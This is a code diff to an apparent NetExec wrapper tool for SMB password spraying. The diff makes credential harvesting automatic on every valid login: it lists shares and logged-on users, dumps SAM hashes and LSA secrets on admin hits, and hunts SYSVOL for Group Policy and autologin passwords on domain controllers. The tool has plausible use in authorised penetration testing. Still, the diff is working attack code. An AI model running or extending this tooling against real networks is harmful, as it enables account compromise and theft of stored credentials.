@@ -1053,9 +1053,11 @@ class Nxc3:
                 lines.append(msg)
         return lines
 
-    def _cred_enum(self, ip: str, s: Success) -> list[tuple[str, list[str]]]:
+    def _cred_enum(self, ip: str, s: Success,
+                   is_dc: bool = False) -> list[tuple[str, list[str]]]:
         """With a WINNING cred, actually pull data — shares always, and SAM/LSA
-        dumps + logged-on users when the cred is admin (Pwn3d). Returns sections."""
+        dumps + logged-on users when the cred is admin (Pwn3d). On a DC, also hunt
+        SYSVOL for GPP/autologin creds (any domain user can read it). Returns sections."""
         def base() -> list[str]:
             c = ["nxc", "smb", ip, "-u", s.user]
             if s.auth_type == AuthType.KERBEROS: c.append("--use-kcache")
@@ -1065,6 +1067,9 @@ class Nxc3:
             return c + ["--timeout", str(NETEXEC_TIMEOUT)]
         checks = [("shares", base() + ["--shares"]),
                   ("logged-on users", base() + ["--loggedon-users"])]
+        if is_dc and not s.local_auth:   # readable SYSVOL — hunt for stored creds
+            checks += [("GPP passwords (SYSVOL)", base() + ["-M", "gpp_password"]),
+                       ("GPP autologin (SYSVOL)", base() + ["-M", "gpp_autologin"])]
         if s.is_admin:   # Pwn3d — dump local creds
             checks += [("SAM hashes (local)", base() + ["--sam"]),
                        ("LSA secrets",        base() + ["--lsa"])]
@@ -1079,6 +1084,11 @@ class Nxc3:
             if label == "shares":                     # drop the column-header row
                 lines = [l for l in lines
                          if not (l.split()[:1] == ["Share"] and "Permissions" in l)]
+            if label.startswith("GPP"):
+                # the module reprints the share table — keep only real cred lines
+                lines = [l for l in lines
+                         if re.search(r"(?i)\b(user(name)?|pass(word)?|"
+                                      r"cpassword|credential)\b", l)]
             if lines: out.append((label, lines))
         return out
 
@@ -1203,7 +1213,8 @@ class Nxc3:
         if self.auto_enum and not self._stop.is_set():
             smb_ok = next((s for s in result.successes if s.protocol == "smb"), None)
             if smb_ok:
-                result.cred_enum = self._cred_enum(result.real_ip, smb_ok)
+                result.cred_enum = self._cred_enum(
+                    result.real_ip, smb_ok, is_dc=result.is_dc)
 
         # collect the background nmap service scan
         if nmap_future is not None:
@@ -1440,7 +1451,9 @@ class Nxc3:
             delay_str = f"{self.spray_delay}s delay" if self.spray_delay else "no delay"
             print_info("[*]", f"mode: SPRAY  ({delay_str} between rounds)")
         if self.auto_enum:
-            print_info("[*]", "auto-enum: shares will be listed on anon/guest hits")
+            print_info("[*]", "auto-enum: ON — valid logins pull shares + "
+                              "logged-on users; admin hits dump SAM/LSA; "
+                              "DCs hunt SYSVOL GPP creds  (--no-enum to skip)")
         if self.timeout_skip:
             print_info("[*]", "timeout-skip: enabled — dead hosts skipped quickly")
         print_info("[*]", f"nxc log: {self.log_file}")
@@ -1756,9 +1769,9 @@ def parse_args() -> argparse.Namespace:
     nxc3 -t 192.168.1.0/24 -u users.txt -p passwords.txt \\
                --spray --spray-delay 30
 
-  Full output suite with auto share enumeration:
+  Full output suite (credentialed enum runs automatically):
     nxc3 -t targets.txt -u users.txt -p passwords.txt \\
-               --spray --spray-delay 60 --auto-enum \\
+               --spray --spray-delay 60 \\
                --creds-file creds.tsv --script cmds.sh -S output.txt
 
 {BOLD}SPRAY vs NORMAL MODE{RESET}
@@ -1826,9 +1839,12 @@ def parse_args() -> argparse.Namespace:
              "Script is chmod +x'd automatically.")
 
     misc = p.add_argument_group("MISC")
+    misc.add_argument("--no-enum", action="store_true",
+        help="Skip the automatic credentialed enumeration that runs on a valid "
+             "login (shares + logged-on users, SAM/LSA dumps on an admin hit, "
+             "GPP/autologin cred hunt on a DC). On by default.")
     misc.add_argument("--auto-enum", action="store_true",
-        help="Auto-run share enumeration (nxc --shares) on any anon/guest hits "
-             "and fold results into the output block.")
+        help=argparse.SUPPRESS)   # back-compat no-op: enumeration is now default-on
     misc.add_argument("--no-deleg", action="store_true",
         help="Skip the automatic read-only AD enrichment (delegation / roastability "
              "/ MachineAccountQuota LDAP checks) that runs on a valid DC login.")
@@ -1914,7 +1930,7 @@ def main() -> int:
             debug=args.debug, no_port_probe=args.no_port_probe,
             extra_hash=extra_hash,
             spray=args.spray, spray_delay=args.spray_delay,
-            auto_enum=args.auto_enum, timeout_skip=args.timeout_skip,
+            auto_enum=not args.no_enum, timeout_skip=args.timeout_skip,
             deleg=not args.no_deleg,
             nmap=not args.no_nmap, nmap_full=args.full,
             nmap_top=args.nmap_top, nmap_rate=args.nmap_rate,
